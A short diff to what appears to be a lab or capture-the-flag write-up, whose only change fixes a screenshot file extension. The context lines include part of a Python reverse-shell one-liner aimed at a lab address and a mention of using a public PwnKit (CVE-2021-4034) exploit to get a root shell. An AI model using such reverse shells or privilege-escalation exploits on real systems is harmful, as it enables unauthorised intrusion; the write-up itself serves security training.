@@ -37,4 +37,4 @@ export RHOST="192.168.49.147";export RPORT=80;python3 -c 'import sys,socket,os,p
 Linpeas found that the system was vulnerable to CVE-2021-4034 aka PwnKit. I used
 this [exploit](https://github.com/ly4k/PwnKit) to obtain a root shell.
 
-![Proof of command execution as root](screenshots/root_proof)
+![Proof of command execution as root](screenshots/root_proof.png)
